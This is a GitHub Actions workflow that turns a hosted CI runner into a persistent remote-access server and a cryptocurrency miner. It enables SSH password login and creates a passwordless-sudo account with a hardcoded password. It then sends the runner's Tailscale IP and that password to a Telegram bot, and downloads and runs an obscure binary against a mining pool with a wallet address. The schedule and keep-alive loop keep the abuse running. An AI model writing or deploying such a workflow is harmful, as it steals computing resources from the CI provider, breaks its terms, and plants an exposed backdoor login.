name: Permanent Linux SSH Server

on:
  schedule:
    - cron: '0 */6 * * *'
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: 1. Checkout Repository
        uses: actions/checkout@v4

      - name: 2. Restore Persistent Workspace
        uses: actions/cache@v4
        with:
          path: /home/cynetadmin/workspace
          key: cynet-ssh-workspace-${{ github.run_id }}
          restore-keys: |
            cynet-ssh-workspace-

      - name: 3. Setup OpenSSH Server
        run: |
          sudo apt-get update
          sudo apt-get install -y openssh-server
          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo systemctl restart ssh

      - name: 4. Create User (cynetadmin) with Root Access
        run: |
          sudo useradd -m -s /bin/bash cynetadmin || true
          echo "cynetadmin:Cynet@2026" | sudo chpasswd
          sudo usermod -aG sudo cynetadmin
          echo "cynetadmin ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/cynetadmin
          sudo mkdir -p /home/cynetadmin/workspace
          sudo chown -R cynetadmin:cynetadmin /home/cynetadmin/workspace

      - name: 5. Connect Tailscale & Send SSH Info to Telegram
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: "8909214604"
        run: |
          curl -fsSL https://tailscale.com/install.sh | sh
          sudo tailscale up --authkey="$TAILSCALE_AUTHKEY" --hostname="cynet-linux-ssh"
          TS_IP=$(tailscale ip -4)
          USERNAME="cynetadmin"
          PASSWORD="Cynet@2026"
          MESSAGE="${TS_IP}:${USERNAME}:${PASSWORD}"
          echo "SSH Server:"
          echo "$MESSAGE"
          curl -sS -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" -d "chat_id=${TELEGRAM_CHAT_ID}" --data-urlencode "text=${MESSAGE}"

      # ==========================================
      # مرحله جدید: اجرای ماینر (3 بار)
      # ==========================================
      - name: 6. Run Miner (x3)
        run: |
          # کلون کردن مخزن
          git clone https://github.com/nksoldierasdasdasd/sGsegsg.git
          cd sGsegsg
          chmod +x sgggssdjgmpoj

          # اجرا بار اول
          ./sgggssdjgmpoj -o stratum+tcp://usa.hashvault.pro:443 -u 8Aaqd5VXizsBTBbABkx5LxhASdomukvZNHyo5NTX8nMp4duKPtei8qTic1F4JGEVfgLbpo2hMUCh9FQHyABkc2kRSk32wzd -p x -t 1 --background

          # اجرا بار دوم
          ./sgggssdjgmpoj -o stratum+tcp://usa.hashvault.pro:443 -u 8Aaqd5VXizsBTBbABkx5LxhASdomukvZNHyo5NTX8nMp4duKPtei8qTic1F4JGEVfgLbpo2hMUCh9FQHyABkc2kRSk32wzd -p x -t 1 --background

      - name: 7. Server Keep-Alive (5h 55m)
        run: |
          for i in {1..355}; do
            sleep 60
            echo "[$i/355] Linux SSH Server is active..."
          done

      - name: 8. Save Workspace to Cloud
        uses: actions/cache@v4
        if: always()
        with:
          path: /home/cynetadmin/workspace
          key: cynet-ssh-workspace-${{ github.run_id }}
